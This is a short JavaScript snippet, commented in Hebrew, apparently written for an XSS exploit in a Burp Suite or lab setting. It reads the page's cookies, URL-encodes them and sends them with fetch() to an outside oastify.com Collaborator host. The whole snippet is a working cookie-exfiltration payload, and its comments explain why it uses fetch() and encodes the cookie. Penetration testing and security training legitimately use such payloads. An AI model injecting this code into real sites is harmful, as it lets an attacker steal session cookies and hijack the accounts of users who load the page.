(function() {
    // 1. קידוד הקוקי כדי למנוע שבירת URL מתווים מיוחדים
    var c = document.cookie;
    var encodedCookie = encodeURIComponent(c);

    // 2. בניית כתובת ה-Collaborator המלאה
    var collaboratorUrl = 'https://mvlrpngdwvv1fj7neimu3jun2e85wvkk.oastify.com/?c=' + encodedCookie;

    // 3. שליחת בקשת GET באמצעות fetch()
    // fetch מבצעת בקשת HTTP טהורה ואמינה יותר מ-new Image().src
    fetch(collaboratorUrl);
})();
